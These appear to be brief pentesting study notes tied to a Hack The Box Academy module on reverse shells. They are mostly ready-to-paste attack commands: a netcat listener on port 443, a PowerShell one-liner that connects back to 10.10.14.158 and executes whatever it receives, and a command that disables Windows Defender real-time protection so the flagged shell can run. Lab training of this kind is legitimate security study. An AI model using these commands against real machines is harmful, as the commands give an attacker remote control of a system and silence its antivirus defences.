
Host is listening, while target initiates connection.

Listen on Host
```shell-session
sudo nc -lvnp 443
```

There is a script: https://academy.hackthebox.com/module/115/section/1106
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
It is flagged by Windows Defender. Copy and paste in target.

Disable Windows Defender:
```powershell-session
Set-MpPreference -DisableRealtimeMonitoring $true
```

